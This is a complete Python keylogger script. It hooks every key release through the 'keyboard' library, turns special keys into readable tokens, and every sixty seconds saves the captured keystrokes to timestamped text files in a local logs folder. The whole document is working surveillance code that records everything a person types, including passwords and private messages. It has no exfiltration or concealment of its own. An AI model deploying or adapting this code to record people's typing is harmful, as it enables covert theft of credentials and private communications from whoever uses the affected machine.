import keyboard
from datetime import datetime
from threading import Timer

SAVE_REPORT_INTERVAL = 60 # seconds

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback(self, event):
        """
        Called whenever a keyboard event occurs
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f'[{name.upper()}]'

        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        with open(f'./logs/{self.filename}.txt', 'w') as f:
            # Write the keylogs to the file
            print(self.log, file=f)
        print(f'Saved most recent keylogs to: {self.filename}.txt')

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == '__main__':
    keylogger = Keylogger(interval=SAVE_REPORT_INTERVAL)
    keylogger.start()